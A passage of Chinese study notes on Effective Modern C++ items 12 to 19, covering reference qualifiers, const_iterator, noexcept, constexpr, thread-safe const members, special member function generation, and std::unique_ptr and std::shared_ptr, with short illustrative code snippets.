keywords），override和final（向虚函数添加final可以防止派生类重写。final也能用于类，这时这个类不能用作基类）。 函数引用限定符 reference qualifiers。如果我们想写一个函数只接受左值实参，我们声明一个non-const左值引用形参： 1void doSomething(Widget&amp; w); //只接受左值Widget对象 如果我们想写一个函数只接受右值实参，我们声明一个右值引用形参： 1void doSomething(Widget&amp;&amp; w); //只接受右值Widget对象 成员函数的引用限定可以很容易的区分一个成员函数被哪个对象（即*this）调用。它和在成员函数声明尾部添加一个const很相似，暗示了调用这个成员函数的对象（即*this）是const的。 考虑下面一个例子： 123456789class Widget &#123;public: using DataType = std::vector&lt;double&gt;; … DataType&amp; data() &#123; return values; &#125; …private: DataType values;&#125;; 客户端代码： 123Widget w;…auto vals1 = w.data(); //拷贝w.values到vals1 Widget::data函数的返回值是一个左值引用（准确的说是std::vector&lt;double&gt;&amp;）, 因为左值引用是左值，所以vals1是从左值初始化的。因此vals1由w.values拷贝构造而得。 现在假设我们有一个创建Widgets的工厂函数， 1Widget makeWidget(); 我们想用makeWidget返回的Widget里的std::vector初始化一个变量： 1auto vals2 = makeWidget().data(); //拷贝Widget里面的值到vals2 Widget是makeWidget返回的临时对象（即右值），所以将其中的std::vector进行拷贝纯属浪费。最好是移动，但是因为data返回左值引用，C++的规则要求编译器不得不生成一个拷贝。 指明当data被右值Widget对象调用的时候结果也应该是一个右值。现在就可以使用引用限定： 1234567891011121314class Widget &#123;public: using DataType = std::vector&lt;double&gt;; … DataType&amp; data() &amp; //对于左值Widgets, &#123; return values; &#125; //返回左值 DataType data() &amp;&amp; //对于右值Widgets, &#123; return std::move(values); &#125; //返回右值 …private: DataType values;&#125;; data重载的返回类型是不同的，左值引用重载版本返回一个左值引用（即一个左值），右值引用重载返回一个临时对象（即一个右值）。这意味着现在客户端的行为和我们的期望相符了： 1234auto vals1 = w.data(); //调用左值重载版本的Widget::data， //拷贝构造vals1auto vals2 = makeWidget().data(); //调用右值重载版本的Widget::data, //移动构造vals2 结论 为重写函数加上override 成员函数引用限定，区别对待左值对象和右值对象（即*this) 13 优先考虑 const_iterator 而不是 iterator STL const_iterator等价于指向常量的指针（pointer-to-const）。它们都指向不能被修改的值。标准实践是能加上const就加上。 只是需要注意，C++11 和 C++98 对 const_iterator 的支持不一样。 没办法简简单单的从non-const容器中获取const_iterator。 123456789101112typedef std::vector&lt;int&gt;::iterator IterT; //typedeftypedef std::vector&lt;int&gt;::const_iterator ConstIterT;std::vector&lt;int&gt; values;…ConstIterT ci = std::find(static_cast&lt;ConstIterT&gt;(values.begin()), //cast static_cast&lt;ConstIterT&gt;(values.end()), //cast 1983);values.insert(static_cast&lt;IterT&gt;(ci), 1998); //可能无法通过编译， //原因见下 因为向 insert 传入const_iterator不能通过编译，所以我们将const_iterator 转换为iterator的。 上面的代码仍然可能无法编译，因为没有一个可移植的从const_iterator到iterator的方法，即使使用static_cast也不行。 所有的这些都在C++11中改变了，现在const_iterator既容易获取又容易使用。容器的成员函数cbegin和cend产出const_iterator，甚至对于non-const容器也可用，那些之前使用iterator指示位置（如insert和erase）的STL成员函数也可以使用const_iterator了。 12345std::vector&lt;int&gt; values; //和之前一样…auto it = //使用cbegin std::find(values.cbegin(), values.cend(), 1983); //和cendvalues.insert(it, 1998); C++11 的一个缺陷是，对于 非成员函数，没有类似的 cbegin，cend 函数支持。C++14补上了这一空白。 非成员函数也叫 自由函数free function，即一个函数，只要不是成员函数就可被称作free function。 举个例子，我们可以泛化下面的findAndInsert： 12345678910111213template&lt;typename C, typename V&gt;void findAndInsert(C&amp; container, //在容器中查找第一次 const V&amp; targetVal, //出现targetVal的位置， const V&amp; insertVal) //然后在那插入insertVal&#123; using std::cbegin; using std::cend; auto it = std::find(cbegin(container), //非成员函数cbegin cend(container), //非成员函数cend targetVal); container.insert(it, insertVal);&#125; 它可以在C++14工作良好，但是很遗憾，C++11不在良好之列。 如果你使用C++11，并且想写一个最大程度通用的代码，而你使用的STL没有提供缺失的非成员函数cbegin，你可以简单的写下你自己的实现。比如，下面就是非成员函数cbegin的实现： 1234template &lt;class C&gt;auto cbegin(const C&amp; container)-&gt;decltype(std::begin(container)) &#123; return std::begin(container); //解释见下&#125; 结论 优先考虑const_iterator而非iterator 在最大程度通用的代码中，优先考虑非成员函数版本的begin，end，rbegin等，而非同名成员函数 14 如果函数不抛出异常请使用noexcept 调用者可以查看函数是否声明为noexcept，这个可以影响到调用代码的异常安全性（exception safety）和效率。就其本身而言，函数是否为noexcept和成员函数是否const一样重要。当你知道这个函数不会抛异常而没加上noexcept，那这个接口说明就有点差劲了。 noexcept 允许编译器生成更好的目标代码。 两种表达方式如下： 12int f(int x) throw(); //C++98风格，没有来自f的异常int f(int x) noexcept; //C++11风格，没有来自f的异常 如果在运行时，f出现一个异常，那么就和f的异常说明冲突了。在C++98的异常说明中，调用栈（the call stack）会展开至f的调用者，在一些与这地方不相关的动作后，程序被终止。C++11异常说明的运行时行为有些不同：调用栈只是可能在程序终止前展开。 展开调用栈和可能展开调用栈两者对于代码生成（code generation）有非常大的影响。在一个noexcept函数中，当异常可能传播到函数外时，优化器不需要保证运行时栈（the runtime stack）处于可展开状态；也不需要保证当异常离开noexcept函数时，noexcept函数中的对象按照构造的反序析构。而标注 “throw()” 异常声明的函数缺少这样的优化灵活性，没加异常声明的函数也一样。可以总结一下： 123RetType function(params) noexcept; //极尽所能优化RetType function(params) throw(); //较少优化RetType function(params); //较少优化 这是一个充分的理由使得你当知道它不抛异常时加上noexcept。 另外对于一些容器数据结构的构造，如果可以就移动，如果必要则复制。对于这个函数只有在知晓移动不抛异常的情况下用C++11的移动操作替换C++98的复制操作才是安全的。 但是如何知道一个函数中的移动操作是否产生异常？答案很明显：它检查这个操作是否被声明为noexcept。 像是 std::vector::push_back 之类的函数调用std::move_if_noexcept，这是个std::move的变体，根据其中类型的移动构造函数是否为noexcept的. std::move_if_noexcept查阅std::is_nothrow_move_constructible这个type trait. swap函数是noexcept的另一个绝佳用地。swap是STL算法实现的一个关键组件，它也常用于拷贝运算符重载中。它的广泛使用意味着对其施加不抛异常的优化是非常有价值的。有趣的是，标准库的swap是否noexcept有时依赖于用户定义的swap是否noexcept。比如，数组和std::pair的swap声明如下： 1234567891011template &lt;class T, size_t N&gt;void swap(T (&amp;a)[N], T (&amp;b)[N]) noexcept(noexcept(swap(*a, *b))); //见下文template &lt;class T1, class T2&gt;struct pair &#123; … void swap(pair&amp; p) noexcept(noexcept(swap(first, p.first)) &amp;&amp; noexcept(swap(second, p.second))); …&#125;; 这些函数视情况noexcept：它们是否noexcept依赖于noexcept声明中的表达式是否noexcept。 一些函数很自然的不应该抛异常，尤其是移动操作和swap。使其noexcept有重大意义，只要可能就应该将它们实现为noexcept。 对于一些函数，使其成为noexcept是很重要的，它们应当默认如是。在C++98，允许内存释放（memory deallocation）函数（即operator delete和operator delete[]）和析构函数抛出异常是糟糕的代码设计，C++11将这种作风升级为语言规则。 默认情况下，内存释放函数和析构函数——不管是用户定义的还是编译器生成的——都是隐式noexcept。因此它们不需要声明noexcept。 析构函数非隐式noexcept的情况仅当类的数据成员（包括继承的成员还有继承成员内的数据成员）明确声明它的析构函数可能抛出异常（如声明“noexcept(false)”）。 如果一个对象的析构函数可能被标准库使用（比如在容器内或者被传给一个算法），析构函数又可能抛异常，那么程序的行为是未定义的。 有时候, 一些库函数, C++98的函数, 即使是决不抛出异常的, 也没有标识为 noexcept. 因为从C标准库移动到了std命名空间，也可能缺少异常规范，std::strlen就是一个例子，它没有声明noexcept. 另外C++98异常规范和C++11不同. 结论 noexcept是函数接口的一部分，这意味着调用者可能会依赖它 noexcept函数较之于non-noexcept函数更容易优化 noexcept对于移动语义，swap，内存释放函数和析构函数非常有用 大多数函数是异常中立的（可能抛也可能不抛异常）而不是noexcept 15 尽量使用 constexpr 从概念上来说，constexpr表明一个值不仅仅是常量，还是编译期可知的。这个表述并不全面，因为当constexpr被用于函数的时候，事情就有一些细微差别了。 但是，并不能保证constexpr函数的结果是const，也不能保证它们的返回值是在编译期可知的。 和const一样，constexpr是编译期可知的。技术上来讲，它们的值在翻译期（translation）决议，所谓翻译（translation）不仅仅包含是编译（compilation）也包含链接（linking）。 编译期可知的值“享有特权”，它们可能被存放到只读存储空间中。对于那些嵌入式系统的开发者，这个特性是相当重要的。更广泛的应用是 “其值编译期可知” 的常量整数会出现在需要 “整型常量表达式（integral constant expression）的上下文中：包括数组大小，整数模板参数（包括std::array对象的长度），枚举名的值，对齐修饰符（alignas(val)），等等。 12345678int sz; //non-constexpr变量…constexpr auto arraySize1 = sz; //错误！sz的值在 //编译期不可知std::array&lt;int, sz&gt; data1; //错误！一样的问题constexpr auto arraySize2 = 10; //没问题，10是 //编译期可知常量std::array&lt;int, arraySize2&gt; data2; //没问题, arraySize2是constexpr 注意const不提供constexpr所能保证之事，因为const对象不需要在编译期初始化它的值。 1234int sz; …const auto arraySize = sz; //没问题，arraySize是sz的const复制std::array&lt;int, arraySize&gt; data; //错误，arraySize值在编译期不可知 简而言之，所有constexpr对象都是const，但不是所有const对象都是constexpr。如果你想编译器保证一个变量有一个值，这个值可以放到那些需要编译期常量（compile-time constants）的上下文的地方，你需要的工具是constexpr而不是const。 注意，I/O语句一般不被允许出现在constexpr函数里。 constexpr 限制 因为constexpr函数必须能在编译期值调用的时候返回编译期结果，就必须对它的实现施加一些限制。这些限制在C++11和C++14标准间有所出入。 C++11中，constexpr函数的代码不超过一行语句：一个return。听起来很受限，但实际上有两个技巧可以扩展constexpr函数的表达能力。第一，使用三元运算符“?:”来代替if-else语句，第二，使用递归代替循环。因此pow可以像这样实现： 123constexpr int pow(int base, int exp) noexcept &#123; return (exp == 0 ? 1 : base * pow(base, exp - 1));&#125; 在C++11中，有两个限制使得Point的成员函数setX和setY不能声明为constexpr。第一，它们修改它们操作的对象的状态， 并且在C++11中，constexpr成员函数是隐式的const。第二，它们有void返回类型，void类型不是C++11中的字面值类型。这两个限制在C++14中放开了，所以C++14中Point的setter（赋值器）也能声明为constexpr： 1234567class Point &#123;public: … constexpr void setX(double newX) noexcept &#123; x = newX; &#125; //C++14 constexpr void setY(double newY) noexcept &#123; y = newY; &#125; //C++14 …&#125;; 现在也能写这样的函数： 12345678//返回p相对于原点的镜像constexpr Point reflection(const Point&amp; p) noexcept&#123; Point result; //创建non-const Point result.setX(-p.xValue()); //设定它的x和y值 result.setY(-p.yValue()); return result; //返回它的副本&#125; C++14 constexpr 在C++14中，constexpr函数的限制变得非常宽松了，所以下面的函数实现成为了可能： 1234567constexpr int pow(int base, int exp) noexcept //C++14&#123; auto result = 1; for (int i = 0; i &lt; exp; ++i) result *= base; return result;&#125; constexpr函数限制为只能获取和返回字面值类型，这基本上意味着那些有了值的类型能在编译期决定。在C++11中，除了void外的所有内置类型，以及一些用户定义类型都可以是字面值类型，因为构造函数和其他成员函数可能是constexpr： 123456789101112131415class Point &#123;public: constexpr Point(double xVal = 0, double yVal = 0) noexcept : x(xVal), y(yVal) &#123;&#125; constexpr double xValue() const noexcept &#123; return x; &#125; constexpr double yValue() const noexcept &#123; return y; &#125; void setX(double newX) noexcept &#123; x = newX; &#125; void setY(double newY) noexcept &#123; y = newY; &#125;private: double x, y;&#125;; Point的构造函数可被声明为constexpr，因为如果传入的参数在编译期可知，Point的数据成员也能在编译器可知。因此这样初始化的Point就能为constexpr： 123constexpr Point p1(9.4, 27.7); //没问题，constexpr构造函数 //会在编译期“运行”constexpr Point p2(28.8, 5.3); //也没问题 类似的，xValue和yValue的getter（取值器）函数也能是constexpr，因为如果对一个编译期已知的Point对象（如一个constexpr Point对象）调用getter，数据成员x和y的值也能在编译期知道。这使得我们可以写一个constexpr函数，里面调用Point的getter并初始化constexpr的对象： 12345678constexprPoint midpoint(const Point&amp; p1, const Point&amp; p2) noexcept&#123; return &#123; (p1.xValue() + p2.xValue()) / 2, //调用constexpr (p1.yValue() + p2.yValue()) / 2 &#125;; //成员函数&#125;constexpr auto mid = midpoint(p1, p2); //使用constexpr函数的结果 //初始化constexpr对象 mid对象通过调用构造函数，getter和非成员函数来进行初始化过程就能在只读内存中被创建出来。 constexpr对象和constexpr函数可以使用的范围比non-constexpr对象和函数大得多。使用constexpr关键字可以最大化你的对象和函数可以使用的场景。 还有个重要的需要注意的是constexpr是对象和函数接口的一部分。加上constexpr相当于宣称“我能被用在C++要求常量表达式的地方”。 结论 constexpr对象是const，它被在编译期可知的值初始化 当传递编译期可知的值时，constexpr函数可以产出编译期可知的结果 constexpr对象和函数可以使用的范围比non-constexpr对象和函数要大 constexpr是对象和函数接口的一部分 16 让 const 成员函数线程安全 考虑下面的例子，计算多项式的根，多项式的根在多项式确定时，根一般是确定的，声明为 const 。 123456789101112131415161718class Polynomial &#123;public: using RootsType = std::vector&lt;double&gt;; RootsType roots() const &#123; if (!rootsAreValid) &#123; //如果缓存不可用 … //计算根 //用rootVals存储它们 rootsAreValid = true; &#125; return rootVals; &#125; private: mutable bool rootsAreValid&#123; false &#125;; //初始化器（initializer）的 mutable RootsType rootVals&#123;&#125;; &#125;; roots是const成员函数，那就表示着它是一个读操作。在没有同步的情况下，让多个线程执行读操作是安全的。 但是，在roots中，这些线程中的一个或两个可能尝试修改成员变量rootsAreValid和rootVals。这就意味着在没有同步的情况下，这些代码会有不同的线程读写相同的内存，这就是数据竞争（data race）的定义。这段代码的行为是未定义的。 问题就是roots被声明为const，但不是线程安全的。 解决这个问题最普遍简单的方法就是——使用mutex（互斥量）： 123456789101112131415161718192021class Polynomial &#123;public: using RootsType = std::vector&lt;double&gt;; RootsType roots() const &#123; std::lock_guard&lt;std::mutex&gt; g(m); //锁定互斥量 if (!rootsAreValid) &#123; //如果缓存无效 … //计算/存储根值 rootsAreValid = true; &#125; return rootsVals; &#125; //解锁互斥量 private: mutable std::mutex m; mutable bool rootsAreValid &#123; false &#125;; mutable RootsType rootsVals &#123;&#125;;&#125;; std::mutex 既不可移动，也不可复制。因而包含他们的类也同时是不可移动和不可复制的 在某些情况下，互斥量的副作用显会得过大。例如，如果你所做的只是计算成员函数被调用了多少次，使用std::atomic 修饰的计数器通常会是一个开销更小的方法（当然是否更小，取决于你使用的硬件和标准库对互斥量的实现）。 1234567891011121314class Point &#123; //2D点public: … double distanceFromOrigin() const noexcept //noexcept的使用 &#123; ++callCount; //atomic的递增 return std::sqrt((x * x) + (y * y)); &#125;private: mutable std::atomic&lt;unsigned&gt; callCount&#123; 0 &#125;; double x, y;&#125;; 与 std::mutex 类似的，实际上 std::atomic 既不可移动，也不可复制。因而包含他们的类也同时是不可移动和不可复制的 但是只使用 std::atomic 存在以下问题： 123456789101112131415161718class Widget &#123;public: … int magicValue() const &#123; if (cacheValid) return cachedValue; else &#123; auto val1 = expensiveComputation1(); auto val2 = expensiveComputation2(); cachedValue = val1 + val2; //第一步 cacheValid = true; //第二步 return cachedValid; &#125; &#125; private: mutable std::atomic&lt;bool&gt; cacheValid&#123; false &#125;; mutable std::atomic&lt;int&gt; cachedValue;&#125;; 仍然可能出现重复计算。考虑： 一个线程调用Widget::magicValue，将cacheValid视为false，执行这两个昂贵的计算，并将它们的和分配给cachedValue。 此时，第二个线程调用Widget::magicValue，也将cacheValid视为false，因此执行刚才完成的第一个线程相同的计算。（这里的“第二个线程”实际上可能是其他几个线程。） 这种行为与使用缓存的目的背道而驰。将cachedValue和CacheValid的赋值顺序交换可以解决这个问题，但结果会更糟。 假设cacheValid是false，那么： 一个线程调用Widget::magicValue，刚执行完将cacheValid设置true的语句。 在这时，第二个线程调用Widget::magicValue，检查cacheValid。看到它是true，就返回cacheValue，即使第一个线程还没有给它赋值。因此返回的值是不正确的。 对于需要同步的是单个的变量或者内存位置，使用std::atomic就足够了。不过，一旦你需要对两个以上的变量或内存位置作为一个单元来操作的话，就应该使用互斥量。 结论 确保const成员函数线程安全（先得明白什么是线程不安全），除非你确定它们永远不会在并发上下文（concurrent context）中使用。 使用std::atomic变量可能比互斥量提供更好的性能，但是它只适合操作单个变量或内存位置。 17 理解特殊成员函数的生成 C++98有四个：默认构造函数，析构函数，拷贝构造函数，拷贝赋值运算符。默认构造函数仅在类完全没有构造函数的时候才生成。 C++11特殊成员函数俱乐部迎来了两位新会员：移动构造函数和移动赋值运算符。它们的签名是： 1234567class Widget &#123;public: … Widget(Widget&amp;&amp; rhs); //移动构造函数 Widget&amp; operator=(Widget&amp;&amp; rhs); //移动赋值运算符 …&#125;; 移动操作仅在需要的时候生成，如果生成了，就会对类的non-static数据成员执行逐成员的移动。 逐成员移动的核心是对对象使用std::move，然后函数决议时会选择执行移动还是拷贝操作。记住如果支持移动就会逐成员移动类成员和基类成员，如果不支持移动就执行拷贝操作就好了。 拷贝构造与移动构造生成方式 如果你声明一个拷贝构造函数，但是没有声明拷贝赋值运算符，如果写的代码用到了拷贝赋值，编译器会帮助你生成拷贝赋值运算符。同样的，如果你声明拷贝赋值运算符但是没有拷贝构造函数，代码用到拷贝构造函数时编译器就会生成它。 两个移动操作不是相互独立的。如果你声明了其中一个，编译器就不再生成另一个。如果你给类声明了，比如，一个移动构造函数，就表明对于移动操作应怎样实现，与编译器应生成的默认逐成员移动有些区别。如果逐成员移动构造有些问题，那么逐成员移动赋值同样也可能有问题。所以声明移动构造函数阻止移动赋值运算符的生成，声明移动赋值运算符同样阻止编译器生成移动构造函数。 如果一个类显式声明了拷贝操作，编译器就不会生成移动操作。这种限制的解释是如果声明拷贝操作（构造或者赋值）就暗示着平常拷贝对象的方法（逐成员拷贝）不适用于该类，编译器会明白如果逐成员拷贝对拷贝操作来说不合适，逐成员移动也可能对移动操作来说不合适。 Rule of Three 如果你声明了拷贝构造函数，拷贝赋值运算符，或者析构函数三者之一，你应该也声明其余两个。 如果一个类显式声明了拷贝操作，编译器就不会生成移动操作。所以，C++11不会为那些有用户定义的析构函数的类生成移动操作。 仅当下面条件成立时才会生成移动操作（当需要时）： 类中没有拷贝操作 类中没有移动操作 类中没有用户定义的析构 假设编译器生成的函数行为是正确的（即逐成员拷贝类non-static数据是你期望的行为），你的工作很简单，C++11的= default就可以表达你想做的： 1234567891011class Widget &#123; public: … ~Widget(); //用户声明的析构函数 … //默认拷贝构造函数 Widget(const Widget&amp;) = default; //的行为还可以 Widget&amp; //默认拷贝赋值运算符 operator=(const Widget&amp;) = default; //的行为还可以 … &#125;; 就算编译器乐于为你的类生成拷贝和移动操作，生成的函数也如你所愿，你也应该手动声明它们然后加上= default。这看起来比较多余，但是它让你的意图更明确，也能帮助你避免一些微妙的bug。 声明析构有潜在的副作用：它阻止了移动操作的生成。然而，拷贝操作的生成是不受影响的。所以手动声明为 =default 是有意义的。 C++11 处理规则 默认构造函数：和C++98规则相同。仅当类不存在用户声明的构造函数时才自动生成。 析构函数：基本上和C++98相同；稍微不同的是现在析构默认noexcept（参见Item14）。和C++98一样，仅当基类析构为虚函数时该类析构才为虚函数。 拷贝构造函数：和C++98运行时行为一样：逐成员拷贝non-static数据。仅当类没有用户定义的拷贝构造时才生成。如果类声明了移动操作它就是delete的。但是，当用户声明了拷贝赋值或者析构，该函数自动生成已被废弃。 拷贝赋值运算符：和C++98运行时行为一样：逐成员拷贝赋值non-static数据。仅当类没有用户定义的拷贝赋值时才生成。如果类声明了移动操作它就是delete的。但是，当用户声明了拷贝构造或者析构，该函数自动生成已被废弃。 移动构造函数和移动赋值运算符：都对非static数据执行逐成员移动。仅当类没有用户定义的拷贝操作，移动操作或析构时才自动生成。 结论 特殊成员函数是编译器可能自动生成的函数：默认构造函数，析构函数，拷贝操作，移动操作。 移动操作仅当类没有显式声明移动操作，拷贝操作，析构函数时才自动生成。 拷贝构造函数仅当类没有显式声明拷贝构造函数时才自动生成，并且如果用户声明了移动操作，拷贝构造就是delete。 拷贝赋值运算符仅当类没有显式声明拷贝赋值运算符时才自动生成，并且如果用户声明了移动操作，拷贝赋值运算符就是delete。当用户声明了析构函数，拷贝操作的自动生成已被废弃。 成员函数模板不抑制特殊成员函数的生成。 18 对独占资源使用 std::unique_ptr 默认情况下，std::unique_ptr大小等同于原始指针，而且对于大多数操作（包括取消引用），他们执行的指令完全相同。这意味着你甚至可以在内存和时间都比较紧张的情况下使用它。如果原始指针够小够快，那么std::unique_ptr一样可以。 std::unique_ptr体现了专有所有权（exclusive ownership）语义。 一个non-null std::unique_ptr始终拥有其指向的内容。移动一个std::unique_ptr将所有权从源指针转移到目的指针。（源指针被设为null） 拷贝一个std::unique_ptr是不允许的，因为如果你能拷贝一个std::unique_ptr，你会得到指向相同内容的两个std::unique_ptr，每个都认为自己拥有（并且应当最后销毁）资源，销毁时就会出现重复销毁。 因此，std::unique_ptr是一种只可移动类型（move-only type）。当析构时，一个non-null std::unique_ptr销毁它指向的资源。默认情况下，资源析构通过对std::unique_ptr里原始指针调用delete来实现。 Investment继承关系的工厂函数可以这样声明： 123template&lt;typename... Ts&gt; //返回指向对象的std::unique_ptr，std::unique_ptr&lt;Investment&gt; //对象使用给定实参创建makeInvestment(Ts&amp;&amp;... params); 调用者应该在单独的作用域中使用返回的std::unique_ptr智能指针： 123456&#123; … auto pInvestment = //pInvestment是 makeInvestment( arguments ); //std::unique_ptr&lt;Investment&gt;类型 …&#125; //销毁 *pInvestment std::unique_ptr将保证指向内容的析构函数被调用，销毁对应资源。 这个规则也有些例外。大多数情况发生于不正常的程序终止。 如果一个异常传播到线程的基本函数，比如程序初始线程的main函数外，或者违反noexcept说明，局部变量可能不会被销毁；如果std::abort或者退出函数（如std::_Exit，std::exit，或std::quick_exit）被调用，局部变量一定没被销毁。 自定义删除器 1234567891011121314151617181920212223242526auto delInvmt = [](Investment* pInvestment) //自定义删除器 &#123; //（lambda表达式） makeLogEntry(pInvestment); delete pInvestment; &#125;;template&lt;typename... Ts&gt;std::unique_ptr&lt;Investment, decltype(delInvmt)&gt; //更改后的返回类型makeInvestment(Ts&amp;&amp;... params)&#123; std::unique_ptr&lt;Investment, decltype(delInvmt)&gt; //应返回的指针 pInv(nullptr, delInvmt); if (/*一个Stock对象应被创建*/) &#123; pInv.reset(new Stock(std::forward&lt;Ts&gt;(params)...)); &#125; else if ( /*一个Bond对象应被创建*/ ) &#123; pInv.reset(new Bond(std::forward&lt;Ts&gt;(params)...)); &#125; else if ( /*一个RealEstate对象应被创建*/ ) &#123; pInv.reset(new RealEstate(std::forward&lt;Ts&gt;(params)...)); &#125; return pInv;&#125; 上述代码中： delInvmt是从makeInvestment返回的对象的自定义的删除器。 删除器类型必须作为第二个类型实参传给std::unique_ptr。 尝试将原始指针（比如new创建）赋值给std::unique_ptr通不过编译，因为是一种从原始指针到智能指针的隐式转换。这种隐式转换会出问题，所以C++11的智能指针禁止这个行为。这就是通过reset来让pInv接管通过new创建的对象的所有权的原因。 使用new时，我们使用std::forward把传给makeInvestment的实参完美转发出去。 自定义删除器的一个形参，类型是Investment*，不管在makeInvestment内部创建的对象的真实类型（如Stock，Bond，或RealEstate）是什么，它最终在lambda表达式中，作为Investment*对象被删除。这意味着我们通过基类指针删除派生类实例，为此，基类Investment必须有虚析构函数。 C++14中，存在返回类型推导，写法更为简单： 12345678910111213141516171819202122232425template&lt;typename... Ts&gt;auto makeInvestment(Ts&amp;&amp;... params) //C++14&#123; auto delInvmt = [](Investment* pInvestment) //现在在 &#123; //makeInvestment里 makeLogEntry(pInvestment); delete pInvestment; &#125;; std::unique_ptr&lt;Investment, decltype(delInvmt)&gt; //同之前一样 pInv(nullptr, delInvmt); if ( … ) //同之前一样 &#123; pInv.reset(new Stock(std::forward&lt;Ts&gt;(params)...)); &#125; else if ( … ) //同之前一样 &#123; pInv.reset(new Bond(std::forward&lt;Ts&gt;(params)...)); &#125; else if ( … ) //同之前一样 &#123; pInv.reset(new RealEstate(std::forward&lt;Ts&gt;(params)...)); &#125; return pInv; //同之前一样&#125; 当使用默认删除器时（如delete），你可以合理假设std::unique_ptr对象和原始指针大小相同。 但是当自定义删除器时，情况可能不再如此。函数指针形式的删除器，通常会使std::unique_ptr的从一个字（word）大小增加到两个。这可能导致 std::unique_ptr对象变得过大。 123456789void delInvmt2(Investment* pInvestment) //函数形式的&#123; //自定义删除器 makeLogEntry(pInvestment); delete pInvestment;&#125;template&lt;typename... Ts&gt; //返回类型大小是std::unique_ptr&lt;Investment, void (*)(Investment*)&gt; //Investment*的指针makeInvestment(Ts&amp;&amp;... params); //加至少一个函数指针的大小 对于函数对象形式的删除器来说，变化的大小取决于函数对象中存储的状态多少，无状态函数（stateless function）对象（比如不捕获变量的lambda表达式）对大小没有影响，这意味当自定义删除器可以实现为函数或者lambda时，尽量使用lambda。 123456789auto delInvmt1 = [](Investment* pInvestment) //无状态lambda的 &#123; //自定义删除器 makeLogEntry(pInvestment); delete pInvestment; &#125;;template&lt;typename... Ts&gt; //返回类型大小是std::unique_ptr&lt;Investment, decltype(delInvmt1)&gt; //Investment*的大小makeInvestment(Ts&amp;&amp;... args); 向 std::shared_ptr 的自动转化 std::unique_ptr是C++11中表示专有所有权的方法，但是其最吸引人的功能之一是它可以轻松高效的转换为std::shared_ptr： 12std::shared_ptr&lt;Investment&gt; sp = //将std::unique_ptr makeInvestment(arguments); //转为std::shared_ptr 这就是std::unique_ptr非常适合用作工厂函数返回类型的原因的关键部分。 工厂函数无法知道调用者是否要对它们返回的对象使用专有所有权语义，或者共享所有权（即std::shared_ptr）是否更合适。 结论 std::unique_ptr是轻量级、快速的、只可移动（move-only）的管理专有所有权语义资源的智能指针 默认情况，资源销毁通过delete实现，但是支持自定义删除器。有状态的删除器（捕获变量的lambda表达式）和函数指针（带参数）会增加std::unique_ptr对象的大小。所以是一般使用无状态的 lambda 表达式 将std::unique_ptr转化为std::shared_ptr非常简单 19 对于共享资源使用std::shared_ptr std::shared_ptr通过引用计数（reference count）来确保它是否是最后一个指向某种资源的指针，引用计数关联资源并跟踪有多少std::shared_ptr指向该资源。如果std::shared_ptr在计数值递减后发现引用计数值为零，没有其他std::shared_ptr指向该资源，它就会销毁资源。 引用计数暗示着性能问题： std::shared_ptr大小是原始指针的两倍，因为它内部包含一个指向资源的原始指针，还包含一个指向资源的引用计数值的原始指针。 引用计数的内存几乎使用动态分配。 std::make_shared创建std::shared_ptr可以避免引用计数的动态分配，但是还存在一些std::make_shared不能使用的场景，这时候引用计数就会动态分配。 递增递减引用计数必须是原子性的，因为多个reader、writer可能在不同的线程。比如，指向某种资源的std::shared_ptr可能在一个线程执行析构（于是递减指向的对象的引用计数），在另一个不同的线程，std::shared_ptr指向相同的对象，但是执行的却是拷贝操作（因此递增了同一个引用计数）。原子操作通常比非原子操作要慢，所以即使引用计数通常只有一个word大小，你也应该假定读写它们是存在开销的。 移动std::shared_ptr会比拷贝它要快：拷贝要求递增引用计数值，移动不需要。移动赋值运算符同理，所以移动构造比拷贝构造快，移动赋值运算符也比拷贝赋值运算符快。 与 std::unique_ptr 的区别 std::shared_ptr使用delete作为资源的默认销毁机制，但是它也支持自定义的删除器。这种支持有别于std::unique_ptr。对于std::unique_ptr来说，删除器类型是智能指针类型的一部分。对于std::shared_ptr则不是： 1234567891011auto loggingDel = [](Widget *pw) //自定义删除器 &#123; makeLogEntry(pw); delete pw; &#125;;std::unique_ptr&lt; //删除器类型是 Widget, decltype(loggingDel) //指针类型的一部分 &gt; upw(new Widget, loggingDel);std::shared_ptr&lt;Widget&gt; //删除器类型不是 spw(new Widget, loggingDel); //指针类型的一部分 std::shared_ptr的设计更为灵活。考虑有两个std::shared_ptr&lt;Widget&gt;，每个自带不同的删除器（比如通过lambda表达式自定义删除器）： 1234auto customDeleter1 = [](Widget *pw) &#123; … &#125;; //自定义删除器，auto customDeleter2 = [](Widget *pw) &#123; … &#125;; //每种类型不同std::shared_ptr&lt;Widget&gt; pw1(new Widget, customDeleter1);std::shared_ptr&lt;Widget&gt; pw2(new Widget, customDeleter2); 因为 pw1 和 pw2 有相同的类型，所以它们都可以放到存放那个类型的对象的容器中： 1std::vector&lt;std::shared_ptr&lt;Widget&gt;&gt; vpw&#123; pw1, pw2 &#125;; 它们也能相互赋值，也可以传入一个形参为std::shared_ptr&lt;Widget&gt;的函数。但是自定义删除器类型不同的std::unique_ptr就不行，因为std::unique_ptr把删除器视作类型的一部分。 另一个不同于std::unique_ptr的地方是，指定自定义删除器不会改变std::shared_ptr对象的大小。不管删除器是什么，一个std::shared_ptr对象都是两个指针大小。这是个好消息，但是它应该让你隐隐约约不安。自定义删除器可以是函数对象，函数对象可以包含任意多的数据。它意味着函数对象是任意大的。 引用计数是另一个更大的数据结构的一部分，那个数据结构通常叫做控制块（control block）。每个std::shared_ptr管理的对象都有个相应的控制块。控制块除了包含引用计数值外还有一个自定义删除器的拷贝，当然前提是存在自定义删除器。如果用户还指定了自定义分配器，控制块也会包含一个分配器的拷贝。控制块可能还包含一些额外的数据，一个次级引用计数weak count。 对于一个创建指向对象的std::shared_ptr的函数来说不可能知道是否有其他std::shared_ptr早已指向那个对象，所以控制块的创建会遵循下面几条规则： std::make_shared总是创建一个控制块。它创建一个要指向的新对象，所以可以肯定std::make_shared调用时对象不存在其他控制块。 当从独占指针（即std::unique_ptr或者std::auto_ptr）上构造出std::shared_ptr时会创建控制块。独占指针没有使用控制块，所以指针指向的对象没有关联控制块。（作为构造的一部分，std::shared_ptr侵占独占指针所指向的对象的独占权，所以独占指针被设置为null） 当从原始指针上构造出std::shared_ptr时会创建控制块。如果你想从一个早已存在控制块的对象上创建std::shared_ptr，你将假定传递一个std::shared_ptr或者std::weak_ptr。作为构造函数实参，而不是原始指针。用std::shared_ptr或者std::weak_ptr作为构造函数实参创建std::shared_ptr不会创建新控制块，因为它可以依赖传递来的智能指针指向控制块。 